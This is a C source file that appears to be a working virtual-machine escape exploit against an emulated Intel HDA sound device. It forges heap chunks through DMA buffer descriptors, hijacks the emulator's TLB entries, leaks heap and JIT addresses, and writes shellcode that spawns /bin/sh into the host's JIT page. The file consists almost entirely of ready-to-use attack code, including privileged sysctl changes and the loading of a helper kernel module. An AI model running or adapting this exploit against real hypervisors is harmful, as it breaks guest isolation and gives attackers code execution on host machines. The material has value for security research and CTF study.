#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <sys/ioctl.h>

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1 << PAGE_SHIFT)
#define PFN_PRESENT     (1ull << 63)
#define PFN_PFN         ((1ull << 55) - 1)
#define PAGE_OFF(addr)  (addr & ((1 << PAGE_SHIFT) - 1))

uint64_t gva_to_gfn(void *addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    close(fd);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | PAGE_OFF((uint64_t)addr);
}

void *mmio_init(void *fixed_va, off_t mmio_base, size_t mmio_size) {
    void *res = NULL;

    int mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("[-] failed to open mmio.");
        exit(EXIT_FAILURE);
    }

    res = mmap(fixed_va, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, mmio_base);
    if (res == MAP_FAILED) {
        perror("[-] failed to mmap mmio.");
        exit(EXIT_FAILURE);
    }
    if (mlock(res, mmio_size) == -1) {
        perror("[-] failed to mlock mmio_mem.");
        exit(EXIT_FAILURE);
    }
    printf("[*] mmio_mem: %p\n", res);

    close(mem_fd);
    return res;
}

#define mmio_write64(mem, offset, value) { \
    (*(volatile uint64_t *)(mem + offset) = value); \
    __sync_synchronize(); \
}

#define HUGEPAGE_SZ (2*1024*1024)
#define HDA_VA      0xcafe000
#define DATA_VA     0xbabe00000
#define HUGE_VA     0xc0de00000
volatile void *hda_mmio_mem = NULL;
volatile void *data = NULL;
volatile void *huge = NULL;

// addr
#define ST_REG(_n, _o) (0x80 + (_n) * 0x20 + (_o)) // _n = 0~3 IN; = 4~7 OUT
/* stream register offsets from stream base */
#define ICH6_REG_SD_CTL			0x00
#define ICH6_REG_SD_LVI			0x0c
#define ICH6_REG_SD_BDLPL		0x18
#define ICH6_REG_SD_BDLPU		0x1c

/* SD_CTL bits */
#define SD_CTL_STREAM_RESET	0x01	/* stream reset bit */
#define SD_CTL_DMA_START	0x02	/* stream DMA start bit */
#define SD_CTL_STREAM_TAG_SHIFT	20

#define set64(idx, off, val) (*(volatile uint64_t*)(data+((idx)*0x2000)+(off)) = (val))

void parse_bdlp(uint8_t st, uint64_t lvi) {
    mmio_write64(hda_mmio_mem, ST_REG(st, ICH6_REG_SD_LVI), lvi);
    mmio_write64(hda_mmio_mem, ST_REG(st, ICH6_REG_SD_CTL), SD_CTL_DMA_START);
    mmio_write64(hda_mmio_mem, ST_REG(st, ICH6_REG_SD_CTL), SD_CTL_STREAM_RESET);
}

#define invlpg() { \
    __asm__ volatile ( \
        "invlpg (%%rax)" \
        : \
        : "a" (HUGE_VA) \
        : "memory" \
    ); \
}
#define CPU_FREQ_MHZ 3000ULL
#define spin() { \
    cycles = CPU_FREQ_MHZ * 100000ULL; \
    __asm__ ( \
        "rdtsc\n\t" \
        "shl $32, %%rdx\n\t" \
        "or %%rdx, %%rax\n\t" \
        "add %0, %%rax\n\t" \
        "mov %%rax, %%rbx\n\t" \
    "1:\n\t" \
        "pause\n\t" \
        "rdtsc\n\t" \
        "shl $32, %%rdx\n\t" \
        "or %%rdx, %%rax\n\t" \
        "cmp %%rbx, %%rax\n\t" \
        "jb 1b" \
        : \
        : "r" (cycles) \
        : "rax", "rbx", "rdx" \
    ); \
}
void resize_CPUTLB() {
    uint64_t cycles = 0;
    invlpg();
    spin();
}

void hijack_CPUTLB() {
    mmio_write64(HDA_VA, ST_REG(2, ICH6_REG_SD_CTL), SD_CTL_DMA_START);
    invlpg();
}

int kfunc_fd = 0;
#define kfunc(addr) ioctl(kfunc_fd, 0x1337, addr)

int main() {
    system("sysctl -w vm.nr_hugepages=102400");
    system("sysctl -w vm.mmap_min_addr=0");
    system("insmod kfunc.ko");
    kfunc_fd = open("/dev/kfunc", O_RDWR);
    if (kfunc_fd < 0) {
        perror("open");
        exit(1);
    }

    hda_mmio_mem = mmio_init((void *)HDA_VA, 0xfebf0000, 0x2000);

    uint64_t data_pa = 0;
    data = mmap((void *)DATA_VA, HUGEPAGE_SZ, PROT_READ|PROT_WRITE,
            MAP_FIXED|MAP_PRIVATE|MAP_ANON|MAP_HUGETLB|MAP_POPULATE, -1, 0);
    data_pa = gva_to_gpa((void *)data);
    printf("[*] data: %p\n", (void *)data);
    printf("[*] data_pa: %p\n", (void *)data_pa);

    for (size_t st = 0; st < 8; st++) {
        uint64_t addr = data_pa+0x2000*st;
        mmio_write64(hda_mmio_mem, ST_REG(st, ICH6_REG_SD_BDLPL), addr&0xffffffff);
    }

    /* Step1: overlap */
    set64(1, 0xf8, 0x815);          // fake chunk2.size
    set64(5, 0xf8, 0x415);          // fake chunk6.size
    for (int st = 6; st >= 0; st--)
        parse_bdlp(st, 0x10-2);     // chunk size = 0x100
    set64(6, 0x400, 0x810);         // fake prev_size for chunk2
    set64(6, 0x408, 0xf5);          // fake next chunk size
    parse_bdlp(6, 0x41-2);          // free chunk6; alloc 0x410 chunk

    /* Step2: Overwrite CPUTLBEntry */
    // 2.1 create overlapped chunk for CPUTLB
    huge = mmap((void *)HUGE_VA, HUGEPAGE_SZ, PROT_READ|PROT_WRITE,
            MAP_FIXED|MAP_PRIVATE|MAP_ANON|MAP_HUGETLB, -1, 0);
    printf("[*] huge: %p\n", huge);

    // invlpg and loop to resize CPUTLB to 0x810 chunk
    *(uint8_t *)huge = 0;
    kfunc(resize_CPUTLB);

    // 2.2 hijack CPUTLB
    *(uint8_t *)huge = 0;
    mmio_write64(hda_mmio_mem, ST_REG(2, ICH6_REG_SD_LVI), 0x9-2);
    kfunc(hijack_CPUTLB); // individual BB
    mmio_write64(hda_mmio_mem, ST_REG(2, ICH6_REG_SD_CTL), SD_CTL_STREAM_RESET);

    // 2.3 overwrite CPUTLBEntry
    set64(7, 0x108, 0x35);
    parse_bdlp(7, 0x11-2); // make only 6 chunks in 0x110 tcache bins
    set64(0, 0xf8, 0x115);
    parse_bdlp(0, 0x10-2);

    volatile void *hit = mmio_init((void *)0x7e00000, 0, 0x1000);
    *(uint8_t *)hit = 0;
    parse_bdlp(1, 0x11-2);

    /* Step3: Leak and execute shellcode in JIT page */
    volatile uint64_t *target = 0;
    //for (size_t i = 0; i < 0x10; i++)
    //    printf("[0x%lx] %p\n", i, (void *)target[i]);

    uint64_t theap = target[0] - 0x30;
    uint64_t jit = target[0x17f] - 0x2d;
    printf("[*] theap: %p\n", (void *)theap);
    printf("[*] jit: %p\n", (void *)jit);

    // 0x1a0 tcache entry
    target[0xa20/8] = jit;
    uint8_t *sc = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j;X\x99H\xbb//bin/shH\xc1\xeb\x08SH\x89\xe7RWH\x89\xe6\xb0;\x0f\x05";
    for (size_t i = 0; i < 0x100/8; i++) {
        set64(7, 8*i, ((uint64_t *)sc)[i]);
    }
    parse_bdlp(7, 0x1a-2);

    return 0;
}

